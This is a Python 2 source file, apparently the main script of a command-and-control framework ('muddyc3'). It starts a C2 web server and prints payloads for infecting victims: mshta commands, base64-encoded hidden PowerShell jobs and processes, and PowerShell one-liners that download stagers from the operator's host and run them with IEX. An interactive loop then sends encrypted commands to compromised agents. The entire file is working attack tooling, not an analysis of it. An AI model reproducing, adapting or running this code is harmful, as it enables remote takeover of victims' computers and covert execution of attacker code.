# Embedded file name: muddyc3.py
import signal
import sys
try:
    from core import config
except ImportError:
    print "run : python start_campaign.py to intialize the configuration"
    exit()
from core import webserver
from core import header
from core.cmd import cmd
from core.config import *
#from core.config  import *
from core.color import bcolors
from core.Encryption import *
from core.config import AESKey
import urllib2
import threading
def signal_handler(sig, frame):
        print('Exit by typing exit')
        #sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    header.Banner()
    #config.set_key()
    CC = []
    if config.HOST=="" or config.PORT=="":
        while len(CC) == 0:
            CC = raw_input('Enter a DN/IP:port for C&C: ip:port: ')
        CC = CC.split(':')
        config.set_port(CC[1])
        config.set_ip(CC[0])
    #proxy = raw_input('Enter PROXY:')
    #if proxy:
    #    ip = proxy
    server = threading.Thread(target=webserver.main, args=())
    server.start()
    print '+' + '-' * 60 + '+'
    cmd().help()
    print '+' + '-' * 60 + '+'
    print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
    print 'mshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
    print 'powershell -c \"mshta http://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload)
    config.PAYLOADS.append('\nmshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
    print ''
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))" -WindowStyle Hidden'
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}{raw}');IEX($s)"
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload = payload.encode('base64').replace('\n', '')
    print bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC
    print '---+Powershell JOB Payload+---\n' + commandJ.replace('{payload}', payload)
    print ''
    print '---+Powershell New Process Payload+---\n' + commandP.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandJ.replace('{payload}', payload))
    config.PAYLOADS.append(commandP.replace('{payload}', payload))
    print bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}{hjf}');IEX($s)"
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload)
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB + File Payload+---'
    print commandF.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandF.replace('{payload}', payload))
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}{hjfs}');IEX($s)"
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload)
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB + File +SCT Payload+---'
    print commandF.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandF.replace('{payload}', payload))
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://{ip}:{port}{raw}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}{raw}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://{ip}:{port}{raw}');\""""
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    print '---+ Powershell simple payloads +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)
    #=======================================================
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://{ip}:{port}{b64stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}{b64stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://{ip}:{port}{b64stager}');\""""
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager)
    payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager)
    payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager)
    print '---+ Powershell base64 stager +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append('---+ Powershell base64 stager +---')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)
    #=======================================================
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://{ip}:{port}{b52stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}{b52stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://{ip}:{port}{b52stager}');\""""
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager)
    payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager)
    payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager)
    print '---+ Powershell base52 stager +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append('---+ Powershell base52 stager +---')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)
    config.PAYLOAD()
    config.STAGER()
    cspayload()

    print '+' + '-' * 60 + '+'
    while True:
        if config.POINTER == 'main':
            command = raw_input('(%s : %s) ' % (config.BASE, config.POINTER))
        else:
            command = raw_input('(%s : Agent(%s)-%s) ' % (config.BASE, str(config.AGENTS[config.POINTER][0]), config.AGENTS[config.POINTER][1]))
        bcommand = command.strip().split()
        if bcommand:
            if bcommand[0] in cmd.COMMANDS:
                result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main':
                config.COMMAND[config.POINTER].append(encrypt(AESKey,command.strip()))


if __name__ == '__main__':
    try :
        main()
    except Exception as e:
        print '[-] ERROR(main): %s' % str(e)
